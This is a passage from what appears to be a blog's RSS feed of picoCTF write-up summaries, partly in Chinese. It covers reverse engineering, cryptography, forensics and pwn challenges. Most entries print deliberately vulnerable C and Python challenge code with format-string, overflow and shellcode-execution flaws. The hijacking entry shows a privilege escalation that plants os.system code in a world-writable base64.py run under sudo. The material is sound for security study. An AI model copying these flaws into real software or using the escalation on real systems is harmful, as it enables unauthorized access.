Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---droids4/index.html</guid><description>PicoCTF - droids4 Background Android App 逆向入門之一：拆開與重組 apk Android App 逆向入門之二：修改 smali 程式碼 Source code package com.hellocmu.picoctf; import android.content.Context; /* loaded from: classes.dex */ public class FlagstaffHill { public static native String cardamom(String str); public static String getFlag(String input, Context ctx) { StringBuilder ace = new StringBuilder("aaa"); StringBuilder jack = new StringBuilder("aaa"); StringBuilder queen = new StringBuilder("aaa"); StringBuilder king = new StringBuilder("aaa"); ace.setCharAt(0, (char) (ace.charAt(0) + 4)); ace.setCharAt(1, (char) (ace.charAt(1) + 19)); ace.setCharAt(2, (char) (ace.charAt(2) + 18)); jack.setCharAt(0, (char) (jack.charAt(0) + 7)); jack.setCharAt(1, (char) (jack.charAt(1) + 0)); jack.setCharAt(2, (char) (jack.charAt(2) + 1)); queen.setCharAt(0, (char) (queen.charAt(0) + 0)); queen.setCharAt(1, (char) (queen.charAt(1) + 11)); queen.setCharAt(2, (char) (queen.charAt(2) + 15)); king.setCharAt(0, (char) (king.charAt(0) + 14)); king.setCharAt(1, (char) (king.charAt(1) + 20)); king.setCharAt(2, (char) (king.charAt(2) + 15)); String password = "".concat(queen.toString()).concat(jack.toString()).concat(ace.toString()).concat(king.toString()); return input.equals(password) ? "call it" : "NOPE"; } } Recon 基本上用眼睛看應該看的出來password是啥，不過他最後只會print出call it或是NOPE，所以我們要像上一題一樣改造一下smali，可以對照一下前一題的smali是怎麼call的</description></item><item><title>PicoCTF - Easy as GDB</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---easy-as-gdb/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---easy-as-gdb/index.html</guid><description>PicoCTF - Easy as GDB Source code :::spoiler IDA Main Function
int __cdecl main(int argc, const char **argv, const char **envp) { char *str_len; // eax int v5; // [esp-8h] [ebp-20h] int v6; // [esp-4h] [ebp-1Ch] char *input_flag; // [esp+4h] [ebp-14h] size_t str_len_1; // [esp+8h] [ebp-10h] char *src; // [esp+Ch] [ebp-Ch] input_flag = calloc(0x200u, 1u); printf("input the flag: "); fgets(input_flag, 512, stdin); str_len = strnlen(aZNh, 512, v5, v6); src = enc_input(str_len, str_len); sub_7C2(src, 1, 1); if ( check_flag(src, str_len_1) == 1 ) puts("Correct!"); else puts("Incorrect."); return 0; } :::</description></item><item><title>PicoCTF - Easy Peasy</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/classic/picoctf---easy-peasy/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/classic/picoctf---easy-peasy/index.html</guid><description>PicoCTF - Easy Peasy tags: PicoCTF CTF Crypto Challenge: Easy Peasy
Background Source code :::spoiler source code
#!/usr/bin/python3 -u import os.path KEY_FILE = "key" KEY_LEN = 50000 FLAG_FILE = "flag" def startup(key_location): flag = open(FLAG_FILE).read() kf = open(KEY_FILE, "rb").read() start = key_location stop = key_location + len(flag) key = kf[start:stop] key_location = stop result = list(map(lambda p, k: "{:02x}".format(ord(p) ^ k), flag, key)) print("This is the encrypted flag!\n{}\n".format("".join(result))) return key_location def encrypt(key_location): ui = input("What data would you like to encrypt? ").rstrip() if len(ui) == 0 or len(ui) > KEY_LEN: return -1 start = key_location stop = key_location + len(ui) kf = open(KEY_FILE, "rb").read() if stop >= KEY_LEN: stop = stop % KEY_LEN key = kf[start:] + kf[:stop] else: key = kf[start:stop] key_location = stop result = list(map(lambda p, k: "{:02x}".format(ord(p) ^ k), ui, key)) print("Here ya go!\n{}\n".format("".join(result))) return key_location print("******************Welcome to our OTP implementation!******************") c = startup(0) while c >= 0: c = encrypt(c) :::</description></item><item><title>PicoCTF - Easy Peasy Or Bad Questions</title><link>https://bernie6401.github.io/security/practice/picoctf/bad-questions/picoctf---easy-peasy-or-bad-questions/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/bad-questions/picoctf---easy-peasy-or-bad-questions/index.html</guid><description>PicoCTF - Easy Peasy Or Bad Questions [TOC]
Challenge: logon🍰 Exploit - Set cookie Challenge: where are the robots🍰 Exploit - robots.txt Payload: https://jupiter.challenges.picoctf.org/problem/56830/robots.txt Payload: https://jupiter.challenges.picoctf.org/problem/56830/1bb4c.html Challenge: Packets Primer🍰 Exploit - search { string directly</description></item><item><title>PicoCTF - Eavesdrop</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---eavesdrop/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---eavesdrop/index.html</guid><description>PicoCTF - Eavesdrop Recon 這一題是有關eavesdropping，代表有一個中間人監聽了所有conversation，先用一些基本的手段看一下整體的pcap packets(strings searching/IO Graphs/Statistic/Extract Default Protocol File…)，但是如果跟一下tcp的packets，可以發現傳輸兩方的對話紀錄，包括傳輸資料的加密方式等等，所以我們就可以直接把傳輸資料解密得到flag
Exploit - Extract File &amp; Decrypt Follow TCP Packets Hey, how do you decrypt this file again? You're serious? Yeah, I'm serious *sigh* openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123 Ok, great, thanks. Let's use Discord next time, it's more secure. C'mon, no one knows we use this program like this! Whatever. Hey. Yeah? Could you transfer the file to me again? Oh great. Ok, over 9002? Yeah, listening. Sent it Got it. You're unbelievable 從以上對話紀錄可以知道他們在9002 port有傳輸資料，並且解密的command是openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123 Extract File 我們可以增加兩個column專門顯示source/destination port 然後找到port 9002的地方，可以發現No.57有附帶資料，把這筆資料另存起來 Note: 儲存資料到file.des3的時候，內容必須要是Salted__9BæÄ'÷b4Ó[ÐNXämn±'-ärGsðÏú :›çk¿«@Û=6 Note2: 也可以用tcpflow的方式把資料download下來 $ sudo tcpflow -r {pcap file} Decrypt File $ openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123 *** WARNING : deprecated key derivation used. Using -iter or -pbkdf2 would be better. Flag: picoCTF{nc_73115_411_dd54ab67}</description></item><item><title>PicoCTF - fermat-strings</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---fermat-strings/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---fermat-strings/index.html</guid><description>PicoCTF - fermat-strings Background C 庫函數 - strcspn()
該函數返回 str1 開頭連續都不含字符串 str2 中字符的字符數。
atoi() - C語言庫函數
這個函數返回一個int值轉換的整數。如果冇有有效的轉換可以執行，它返回零。
C 库函数 - snprintf()
snprintf() 函數的返回值是輸出到 str 緩沖區中的字符數，不包括字符串結尾的空字符 \0。如果 snprintf() 輸出的字符數超過了 size 參數指定的緩沖區大小，則輸出的結果會被截斷，只有 size - 1 個字符被寫入緩沖區，最後一個字符為字符串結尾的空字符 \0。
需要注意的是，snprintf() 函數返回的字符數並不包括字符串結尾的空字符 \0，因此如果需要將輸出結果作為一個字符串使用，則需要在緩沖區的末尾添加一個空字符 \0。
Format Specifiers in C
Source code :::spoiler
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;math.h> #define SIZE 0x100 int main(void) { char A[SIZE]; char B[SIZE]; int a = 0; int b = 0; puts("Welcome to Fermat\\'s Last Theorem as a service"); setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stderr, NULL); printf("A: "); read(0, A, SIZE); printf("B: "); read(0, B, SIZE); A[strcspn(A, "\n")] = 0; B[strcspn(B, "\n")] = 0; a = atoi(A); b = atoi(B); if(a == 0 || b == 0) { puts("Error: could not parse numbers!"); return 1; } char buffer[SIZE]; snprintf(buffer, SIZE, "Calculating for A: %s and B: %s\n", A, B); printf(buffer); int answer = -1; for(int i = 0; i &lt; 100; i++) { if(pow(a, 3) + pow(b, 3) == pow(i, 3)) { answer = i; } } if(answer != -1) printf("Found the answer: %d\n", answer); } :::</description></item><item><title>PicoCTF - File types</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---file-types/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---file-types/index.html</guid><description>PicoCTF - File types tags: PicoCTF CTF Misc Challenge: File types
Background For Shell Script Linux MD5 Linux egrep命令 Shell test 命令
-f 文件名: 如果文件存在且为普通文件则为真
How to modify $PATH touch - time stamp What is $$ in bash?
For Compress Command Linux 備份檔案操作 cpio 指令教學與範例 bzip2 command in Linux Gzip Command in Linux Lzip Manual lz4 manual lzma manual lzop(1) - Linux man page
Source code :::spoiler Flag.pdf
#!/bin/sh # This is a shell archive (produced by GNU sharutils 4.15.2). # To extract the files from this archive, save it to some FILE, remove # everything before the '#!/bin/sh' line above, then type 'sh FILE'. # lock_dir=_sh00046 # Made on 2022-03-15 06:50 UTC by &lt;root@e8647f66bc56>. # Source directory was '/app'. # # Existing files will *not* be overwritten, unless '-c' is specified. # # This shar contains: # length mode name # ------ ---------- ------------------------------------------ # 1092 -rw-r--r-- flag # MD5SUM=${MD5SUM-md5sum} f=`${MD5SUM} --version | egrep '^md5sum .*(core|text)utils'` test -n "${f}" &amp;&amp; md5check=true || md5check=false ${md5check} || \ echo 'Note: not verifying md5sums. Consider installing GNU coreutils.' if test "X$1" = "X-c" then keep_file='' else keep_file=true fi echo=echo save_IFS="${IFS}" IFS="${IFS}:" gettext_dir= locale_dir= set_echo=false for dir in $PATH do if test -f $dir/gettext \ &amp;&amp; ($dir/gettext --version >/dev/null 2>&amp;1) then case `$dir/gettext --version 2>&amp;1 | sed 1q` in *GNU*) gettext_dir=$dir set_echo=true break ;; esac fi done if ${set_echo} then set_echo=false for dir in $PATH do if test -f $dir/shar \ &amp;&amp; ($dir/shar --print-text-domain-dir >/dev/null 2>&amp;1) then locale_dir=`$dir/shar --print-text-domain-dir` set_echo=true break fi done if ${set_echo} then TEXTDOMAINDIR=$locale_dir export TEXTDOMAINDIR TEXTDOMAIN=sharutils export TEXTDOMAIN echo="$gettext_dir/gettext -s" fi fi IFS="$save_IFS" if (echo "testing\c"; echo 1,2,3) | grep c >/dev/null then if (echo -n test; echo 1,2,3) | grep n >/dev/null then shar_n= shar_c=' ' else shar_n=-n shar_c= ; fi else shar_n= shar_c='\c' ; fi f=shar-touch.$$ st1=200112312359.59 st2=123123592001.59 st2tr=123123592001.5 # old SysV 14-char limit st3=1231235901 if touch -am -t ${st1} ${f} >/dev/null 2>&amp;1 &amp;&amp; \ test ! -f ${st1} &amp;&amp; test -f ${f}; then shar_touch='touch -am -t $1$2$3$4$5$6.$7 "$8"' elif touch -am ${st2} ${f} >/dev/null 2>&amp;1 &amp;&amp; \ test ! -f ${st2} &amp;&amp; test ! -f ${st2tr} &amp;&amp; test -f ${f}; then shar_touch='touch -am $3$4$5$6$1$2.$7 "$8"' elif touch -am ${st3} ${f} >/dev/null 2>&amp;1 &amp;&amp; \ test ! -f ${st3} &amp;&amp; test -f ${f}; then shar_touch='touch -am $3$4$5$6$2 "$8"' else shar_touch=: echo ${echo} 'WARNING: not restoring timestamps. Consider getting and installing GNU '\''touch'\'', distributed in GNU coreutils...' echo fi rm -f ${st1} ${st2} ${st2tr} ${st3} ${f} # if test ! -d ${lock_dir} ; then : else ${echo} "lock directory ${lock_dir} exists" exit 1 fi if mkdir ${lock_dir} then ${echo} "x - created lock directory ${lock_dir}." else ${echo} "x - failed to create lock directory ${lock_dir}." exit 1 fi # ============= flag ============== if test -n "${keep_file}" &amp;&amp; test -f 'flag' then ${echo} "x - SKIPPING flag (file already exists)" else ${echo} "x - extracting flag (text)" sed 's/^X//' &lt;&lt; 'SHAR_EOF' | uudecode &amp;&amp; begin 600 flag M(3QA&lt;F-H/@IF;&amp;%G+R`@("`@("`@("`@,"`@("`@("`@("`@,"`@("`@,"`@ M("`@-C0T("`@("`Q,#(T("`@("`@8`K'&lt;6D`&amp;[RD@0`````!````,&amp;(\-P4` M``#_`69L86&lt;``$)::#DQ05DF4UG8%@C,```E___[Y[M[G]GO[=^W[_N__^6^ MYJGOD+YKS[D]VU]`>Q]/?;`!&amp;;"0&amp;@:`!H:`T:9-`#3330T:::`!H-'J:``8 MC0:!H,C1HR#1HR,C)ZFFCU-'E'J8T:AR`Q#1B`-`&amp;3330`80:`!B,!,1DT-` M`#$&amp;1ID9#!,@R::&amp;$PAHR#3"JGZ4R,C1HTT#U&amp;(80#1H`9,C1ZF0Q`9``>H` M!D````]3$`,F(`T&amp;AHT!`$`-$2N?R0*H(%R04*&lt;D(7$`\"P"6J(/ORS5EV'E MY1A`\T1>[HJ%R[CD]7UCS7E.#93IHR*#^?R7/$W6*1]HGQ=6EJ_/A$B_2&lt;_G M5]3/.*(B)V8P\40AS.5X&lt;KE?9IM4'Q&lt;3&amp;PH+K"FJ)I6/1XOFW@W&lt;,00&lt;]B>2 MPX5/>V_P:DLC2^>A1^[>Y#?DS"9KG7[]/=&lt;ASJ7MJ$$R&amp;\`6.9W")P6VS9LD M.F7L4"\Y$H\1@O$:/N]]&lt;+E+8B9)"'%;)PX-A@F\-3%=ICS(%E2AC+#,!8,&lt; MZ%O`&lt;_HMM@M%6#]!6"7]`2W:!\.3@RYX$/2&amp;/(\:I$&lt;N@*34)6G+(BNGHY5V M0T)XU&amp;!)Q5B-(=%VD-NN'6ZZ(BF`XC3PJ\R/QN6:)#XCNK?X%$*H>1Z(HQ>C M#5HSE`/XJAZ-J?*((R/%CB[DBG"A(;`L$9@`QW$``````````````0`````` M```+``````!44D%)3$52(2$A```````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` ,```````````````` ` end SHAR_EOF (set 20 22 03 15 06 50 36 'flag' eval "${shar_touch}") &amp;&amp; \ chmod 0644 'flag' if test $? -ne 0 then ${echo} "restore of flag failed" fi if ${md5check} then ( ${MD5SUM} -c >/dev/null 2>&amp;1 || ${echo} 'flag': 'MD5 check failed' ) &lt;&lt; \SHAR_EOF b5cc2c5756410f2467168f6d4c468f52 flag SHAR_EOF else test `LC_ALL=C wc -c &lt; 'flag'` -ne 1092 &amp;&amp; \ ${echo} "restoration warning: size of 'flag' is not 1092" fi fi if rm -fr ${lock_dir} then ${echo} "x - removed lock directory ${lock_dir}." else ${echo} "x - failed to remove lock directory ${lock_dir}." exit 1 fi exit 0 :::</description></item><item><title>PicoCTF - filtered-shellcode</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---filtered-shellcode/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---filtered-shellcode/index.html</guid><description>PicoCTF - filtered-shellcode Background Shell Code Reverse
Source code :::spoiler Source Code Got From Server After Get Shell
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #define MAX_LENGTH 1000 void execute(char *shellcode, size_t length) { if (!shellcode || !length) { exit(1); } size_t new_length = length * 2; char result[new_length + 1]; int spot = 0; for (int i = 0; i &lt; new_length; i++) { if ((i % 4) &lt; 2) { result[i] = shellcode[spot++]; } else { result[i] = '\x90'; } } // result[new_length] = '\xcc'; result[new_length] = '\xc3'; // Execute code int (*code)() = (int(*)())result; code(); } int main(int argc, char *argv[]) { setbuf(stdout, NULL); char buf[MAX_LENGTH]; size_t length = 0; char c = '\0'; printf("Give me code to run:\n"); c = fgetc(stdin); while ((c != '\n') &amp;&amp; (length &lt; MAX_LENGTH)) { buf[length] = c; c = fgetc(stdin); length++; } if (length % 2) { buf[length] = '\x90'; length++; } execute(buf, length); return 0; } :::</description></item><item><title>PicoCTF - flag leak</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---flag-leak/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---flag-leak/index.html</guid><description>PicoCTF - flag leak Background Format String Bug Source code :::spoiler
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;wchar.h> #include &lt;locale.h> #define BUFSIZE 64 #define FLAGSIZE 64 void readflag(char* buf, size_t len) { FILE *f = fopen("flag.txt","r"); if (f == NULL) { printf("%s %s", "Please create 'flag.txt' in this directory with your", "own debugging flag.\n"); exit(0); } fgets(buf,len,f); // size bound read } void vuln(){ char flag[BUFSIZE]; char story[128]; readflag(flag, FLAGSIZE); printf("Tell me a story and then I'll tell you one >> "); scanf("%127s", story); printf("Here's a story - \n"); printf(story); printf("\n"); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); vuln(); return 0; } :::</description></item><item><title>PicoCTF - flag_shop</title><link>https://bernie6401.github.io/security/practice/picoctf/general-skills/picoctf---flag_shop/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/general-skills/picoctf---flag_shop/index.html</guid><description>PicoCTF - flag_shop tags: PicoCTF CTF General Skill Background Bof
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;stdlib.h> int main() { setbuf(stdout, NULL); int con; con = 0; int account_balance = 1100; while(con == 0){ printf("Welcome to the flag exchange\n"); printf("We sell flags\n"); printf("\n1. Check Account Balance\n"); printf("\n2. Buy Flags\n"); printf("\n3. Exit\n"); int menu; printf("\n Enter a menu selection\n"); fflush(stdin); scanf("%d", &amp;menu); if(menu == 1){ printf("\n\n\n Balance: %d \n\n\n", account_balance); } else if(menu == 2){ printf("Currently for sale\n"); printf("1. Defintely not the flag Flag\n"); printf("2. 1337 Flag\n"); int auction_choice; fflush(stdin); scanf("%d", &amp;auction_choice); if(auction_choice == 1){ printf("These knockoff Flags cost 900 each, enter desired quantity\n"); int number_flags = 0; fflush(stdin); scanf("%d", &amp;number_flags); if(number_flags > 0){ int total_cost = 0; total_cost = 900*number_flags; printf("\nThe final cost is: %d\n", total_cost); if(total_cost &lt;= account_balance){ account_balance = account_balance - total_cost; printf("\nYour current balance after transaction: %d\n\n", account_balance); } else{ printf("Not enough funds to complete purchase\n"); } } } else if(auction_choice == 2){ printf("1337 flags cost 100000 dollars, and we only have 1 in stock\n"); printf("Enter 1 to buy one"); int bid = 0; fflush(stdin); scanf("%d", &amp;bid); if(bid == 1){ if(account_balance > 100000){ FILE *f = fopen("flag.txt", "r"); if(f == NULL){ printf("flag not found: please run this on the server\n"); exit(0); } char buf[64]; fgets(buf, 63, f); printf("YOUR FLAG IS: %s\n", buf); } else{ printf("\nNot enough funds for transaction\n\n\n"); }} } } else{ con = 1; } } return 0; } :::</description></item><item><title>PicoCTF - Forky</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---forky/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---forky/index.html</guid><description>PicoCTF - Forky Background fork用法與範例 Source code Main Function From IDA
int __cdecl main(int argc, const char **argv, const char **envp) { _DWORD *v4; // [esp+8h] [ebp-Ch] v4 = mmap(0, 4u, 3, 33, -1, 0); *v4 = 1000000000; fork(); fork(); fork(); fork(); *v4 += 1234567890; doNothing(*v4); return 0; } Recon 這一題很有趣，有了background之後其實對這一題的想法差不多就和1差不多，也就是parent process fork出child process後會繼續往下fork出grandchild process，直到parent process執行完成
+ | +-----------------------------------+ | | +-----------------+ +-----------------+ | | | | +--------+ +--------+ +--------+ +--------+ | | | | | | | | +---+ +---+ +---+ +---+ +---+ +---+ +---+ +---+ | | | | | | | | | | | | | | | | O O O O O O O O O O O O O O O O 而且他們所操作的外部記憶體對象都會是一樣的，代表*v4最終會被加16次，只是我沒有考慮到負號的問題，因為該題是32bits，代表加到一定程度會overflow，所以都沒解出來</description></item><item><title>PicoCTF - function overwrite</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---function-overwrite/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---function-overwrite/index.html</guid><description>PicoCTF - function overwrite Background Array Bound
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;wchar.h> #include &lt;locale.h> #define BUFSIZE 64 #define FLAGSIZE 64 int calculate_story_score(char *story, size_t len) { int score = 0; for (size_t i = 0; i &lt; len; i++) { score += story[i]; } return score; } void easy_checker(char *story, size_t len) { if (calculate_story_score(story, len) == 1337) { char buf[FLAGSIZE] = {0}; FILE *f = fopen("flag.txt", "r"); if (f == NULL) { printf("%s %s", "Please create 'flag.txt' in this directory with your", "own debugging flag.\n"); exit(0); } fgets(buf, FLAGSIZE, f); // size bound read printf("You're 1337. Here's the flag.\n"); printf("%s\n", buf); } else { printf("You've failed this class."); } } void hard_checker(char *story, size_t len) { if (calculate_story_score(story, len) == 13371337) { char buf[FLAGSIZE] = {0}; FILE *f = fopen("flag.txt", "r"); if (f == NULL) { printf("%s %s", "Please create 'flag.txt' in this directory with your", "own debugging flag.\n"); exit(0); } fgets(buf, FLAGSIZE, f); // size bound read printf("You're 13371337. Here's the flag.\n"); printf("%s\n", buf); } else { printf("You've failed this class."); } } void (*check)(char*, size_t) = hard_checker; int fun[10] = {0}; void vuln() { char story[128]; int num1, num2; printf("Tell me a story and then I'll tell you if you're a 1337 >> "); scanf("%127s", story); printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n"); scanf("%d %d", &amp;num1, &amp;num2); if (num1 &lt; 10) { fun[num1] += num2; } check(story, strlen(story)); } int main(int argc, char **argv) { setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); vuln(); return 0; } :::</description></item><item><title>PicoCTF - gogo</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---gogo/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---gogo/index.html</guid><description>PicoCTF - gogo Source code :::spoiler IDA Main Function
// main.main void __cdecl main_main() { _slice_interface_ typ[2]; // [esp+0h] [ebp-58h] BYREF string *second_flag; // [esp+20h] [ebp-38h] string *flag; // [esp+24h] [ebp-34h] _slice_interface_ v3; // [esp+28h] [ebp-30h] BYREF string *v4; // [esp+34h] [ebp-24h] _DWORD v5[2]; // [esp+38h] [ebp-20h] BYREF _DWORD v6[2]; // [esp+40h] [ebp-18h] BYREF _slice_interface_ v7; // [esp+48h] [ebp-10h] BYREF string *v8; // [esp+54h] [ebp-4h] flag = runtime_newobject(&amp;RTYPE_string_0); typ[0].array = "Enter Password: "; typ[0].len = 16; memset(&amp;typ[0].cap, 0, sizeof(_slice_interface_)); fmt_Printf(*&amp;typ[0].array, *&amp;typ[0].cap); v6[0] = &amp;RTYPE__ptr_string; v6[1] = flag; typ[0].array = "%s\n"; typ[0].len = 3; typ[0].cap = v6; *&amp;typ[1].array = 0x100000001LL; fmt_Scanf(*&amp;typ[0].array, *&amp;typ[0].cap); if ( main_checkPassword(*flag) ) { v5[0] = &amp;RTYPE_string_0; v5[1] = &amp;main_statictmp_0; typ[0].array = v5; *&amp;typ[0].len = 0x100000001LL; fmt_Println(typ[0]); v3.cap = &amp;RTYPE_string_0; v4 = &amp;main_statictmp_1; typ[0].array = &amp;v3.cap; *&amp;typ[0].len = 0x100000001LL; fmt_Println(typ[0]); v3.array = &amp;RTYPE_string_0; v3.len = &amp;main_statictmp_2; typ[0].array = &amp;v3; *&amp;typ[0].len = 0x100000001LL; fmt_Println(typ[0]); second_flag = runtime_newobject(&amp;RTYPE_string_0); v7.cap = &amp;RTYPE__ptr_string; v8 = second_flag; typ[0].array = "%s\n"; typ[0].len = 3; typ[0].cap = &amp;v7.cap; *&amp;typ[1].array = 0x100000001LL; fmt_Scanf(*&amp;typ[0].array, *&amp;typ[0].cap); main_ambush(*second_flag); runtime_deferproc(0, &amp;stru_81046A0); } else { v7.array = &amp;RTYPE_string_0; v7.len = &amp;main_statictmp_3; typ[0].array = &amp;v7; *&amp;typ[0].len = 0x100000001LL; fmt_Println(typ[0]); } runtime_deferreturn(typ[0].array); } :::</description></item><item><title>PicoCTF - Guessing Game 1</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---guessing-game-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---guessing-game-1/index.html</guid><description>PicoCTF - Guessing Game 1 Background ROP Chain Linux System Call Table for x86 64
Source code :::spoiler
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;sys/stat.h> #define BUFSIZE 100 long increment(long in) { return in + 1; } long get_random() { return rand() % BUFSIZE; } int do_stuff() { long ans = get_random(); ans = increment(ans); int res = 0; printf("What number would you like to guess?\n"); char guess[BUFSIZE]; fgets(guess, BUFSIZE, stdin); long g = atol(guess); if (!g) { printf("That's not a valid number!\n"); } else { if (g == ans) { printf("Congrats! You win! Your prize is this print statement!\n\n"); res = 1; } else { printf("Nope!\n\n"); } } return res; } void win() { char winner[BUFSIZE]; printf("New winner!\nName? "); fgets(winner, 360, stdin); printf("Congrats %s\n\n", winner); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); int res; printf("Welcome to my guessing game!\n\n"); while (1) { res = do_stuff(); if (res) { win(); } } return 0; } :::</description></item><item><title>PicoCTF - Guessing Game 2</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---guessing-game-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---guessing-game-2/index.html</guid><description>PicoCTF - Guessing Game 2 Background fmt / leak libc / ret2libc / leak canary
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;sys/stat.h> #define BUFSIZE 512 long get_random() { return rand; } int get_version() { return 2; } // void print(long n) // { // // If number is smaller than 0, put a - sign // // and change number to positive // if (n &lt; 0) { // putchar('-'); // n = -n; // } // // Remove the last digit and recur // if (n/10) // print(n/10); // // Print the last digit // putchar(n%10 + '0'); // } int do_stuff() { long ans = (get_random() % 4096) + 1; // print(ans); int res = 0; printf("What number would you like to guess?\n"); char guess[BUFSIZE]; fgets(guess, BUFSIZE, stdin); long g = atol(guess); if (!g) { printf("That's not a valid number!\n"); } else { if (g == ans) { printf("Congrats! You win! Your prize is this print statement!\n\n"); res = 1; } else { printf("Nope!\n\n"); } } return res; } void win() { char winner[BUFSIZE]; printf("New winner!\nName? "); gets(winner); printf("Congrats: "); printf(winner); printf("\n\n"); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); int res; printf("Welcome to my guessing game!\n"); printf("Version: %x\n\n", get_version()); while (1) { res = do_stuff(); if (res) { win(); } } return 0; } :::</description></item><item><title>PicoCTF - hijacking</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---hijacking/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---hijacking/index.html</guid><description>PicoCTF - hijacking Background Privilege Escalation
Hint 1: Check for Hidden files Hint 2: No place like Home:)
Linux sudo命令
-l 顯示出自己（執行 sudo 的使用者）的權限
Recon 第一次遇到提權的問題，感覺很新鮮也很好玩，不過因為沒啥概念所以主要是參考1
首先觀察一下各個file或folders，根目錄有個challenge folder，另外家目錄有一個.server.py檔案，裡面的內容不太重要，只需要知道他import哪些library 現在的問題是按照目前的權限，無法讀取challenge相關的資訊，所以我們要提升權限，主要的做法是利用base64.py這個mod全開的檔案進行讀寫，再利用python執行有import base64的.server.py檔案就可以執行shell 為神麼要用base64.py當作主要的突破口就是因為只有他的mod全開 $ ls -al /usr/lib/python3.8 ... -rwxrwxrwx 1 root root 20382 Nov 14 2022 base64.py ... -rw-r--r-- 1 root root 38995 Nov 14 2022 os.py ... -rw-r--r-- 1 root root 35243 Nov 14 2022 socket.py Exploit $ ssh picoctf@saturn.picoctf.net -p 58219 $ find / -name "base64.py" ... /usr/lib/python3.8/base64.py ... $ vim /usr/lib/python3.8/base64.py # add these line and save the file import os os.system('ls -al /challenge') $ sudo -l Matching Defaults entries for picoctf on challenge: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User picoctf may run the following commands on challenge: (ALL) /usr/bin/vi (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py $ sudo 